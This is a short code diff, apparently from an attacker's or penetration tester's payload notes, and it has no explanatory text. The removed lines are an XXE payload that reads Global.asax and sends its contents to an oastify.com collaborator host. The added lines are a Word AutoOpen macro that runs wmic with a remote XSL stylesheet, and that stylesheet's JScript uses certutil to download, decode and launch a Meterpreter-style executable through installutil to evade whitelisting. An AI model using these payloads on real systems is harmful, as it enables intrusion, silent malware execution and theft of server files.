@@ -1,4 +1,20 @@
-<!ENTITY % file SYSTEM "file:///Global.asax">
-<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'https://f4k0htwbltjnanyhaf8q6x79c0iz6o.oastify.com/?x=%file;'>">
-%eval;
-%exfiltrate;
+Sub AutoOpen()
+    Shell "wmic process get brief /format:""http://192.168.1.211/payload.xsl""", vbHide 
+End Sub
+
+<?xml version='1.0'?>
+<stylesheet version="1.0"
+xmlns="http://www.w3.org/1999/XSL/Transform"
+xmlns:ms="urn:schemas-microsoft-com:xslt"
+xmlns:user="http://mycompany.com/mynamespace%22%3E
+
+<output method="text"/>
+  <ms:script implements-prefix="user" language="JScript">
+    <![CDATA[
+      var ob = new ActiveXObject("WScript.Shell");
+      ob.Run("certutil.exe -urlcache -f http://<Kali_IP_web>/met.enc C:\Users\Public\met.enc", 0, true);
+      ob.Run("certutil.exe -decode C:\Users\Public\met.enc C:\Users\Public\met.exe", 0, true);
+      ob.Run("C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U C:\Users\Public\met.exe", 0, true);
+    ]]>
+  </ms:script>
+</stylesheet>
